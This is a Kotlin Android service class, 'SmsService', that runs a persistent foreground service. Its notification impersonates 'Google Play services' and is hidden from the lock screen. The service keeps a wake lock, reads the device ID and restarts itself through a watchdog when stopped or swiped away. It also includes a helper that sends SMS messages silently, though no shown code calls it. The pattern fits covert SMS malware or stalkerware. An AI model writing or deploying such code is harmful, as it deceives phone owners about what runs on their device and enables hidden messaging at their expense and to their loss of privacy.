package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.test.utils.UnifiedWatchdogScheduler
import kotlinx.coroutines.*

class SmsService : Service() {

    private lateinit var deviceId: String
    
    companion object {
        @Volatile var isRunning = false
        
        private const val TAG = "SmsService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "sms_service_channel"
        
        private const val PREF = "service_alive"
        private const val KEY_LAST_ALIVE = "last_alive_SmsService"
        
        fun markAlive(ctx: Context) {
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
                .edit().putLong(KEY_LAST_ALIVE, SystemClock.elapsedRealtime()).apply()
        }
        
        fun lastAlive(ctx: Context): Long =
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).getLong(KEY_LAST_ALIVE, 0L)
    }
    
    private var pollingThread: Thread? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var heartbeatJob: Job? = null
    private var cleanupJob: Job? = null
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO + CoroutineExceptionHandler { _, t ->
        Log.e(TAG, "Coroutine error: ${t.message}", t)
    })

    override fun onCreate() {
        super.onCreate()
        
        com.example.test.utils.DirectBootHelper.logStatus(this)
        
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        acquireWakeLock()
        startForegroundNotification()
        startCleanupLoop()
        startHeartbeat()
    }
    
    private fun startCleanupLoop() {
        cleanupJob = serviceScope.launch {
            while (isActive) {
                delay(10 * 60 * 1000L) // Every 10 minutes
                val rt = Runtime.getRuntime()
                val usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024 / 1024
                if (usedMB > 120) {
                    runCatching { cacheDir.deleteRecursively() }
                }
            }
        }
    }
    
    private fun startHeartbeat() {
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                markAlive(applicationContext)
                delay(60_000L) // Every 60 seconds
            }
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG::WakeLock"
            )
            wakeLock?.acquire(10 * 60 * 1000L)
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock failed: ${e.message}")
        }
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",
                NotificationManager.IMPORTANCE_LOW // 🔹 higher than MIN to keep alive
            ).apply {
                description = "Google Play services keeps your apps up to date"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")
            .setContentText("Updating apps...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT) // 🔹 not too low
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun sendSms(phone: String, message: String) {
        try {
            SmsManager.getDefault().sendTextMessage(phone, null, message, null, null)
        } catch (e: Exception) {
            Log.e(TAG, "SMS failed: ${e.message}", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) {
            Log.d(TAG, "Already running, skip duplicate start")
            return START_STICKY
        }
        isRunning = true
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        pollingThread?.interrupt()
        wakeLock?.release()
        
        serviceScope.launch {
            cleanup()
            UnifiedWatchdogScheduler.kickNow(applicationContext)
        }
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        serviceScope.launch {
            cleanup()
            UnifiedWatchdogScheduler.kickNow(applicationContext)
        }
    }
    
    private suspend fun cleanup() = withContext(Dispatchers.IO) {
        cleanupJob?.cancel()
        heartbeatJob?.cancel()
        serviceScope.coroutineContext.cancelChildren()
        Log.d(TAG, "Service cleaned up")
    }
}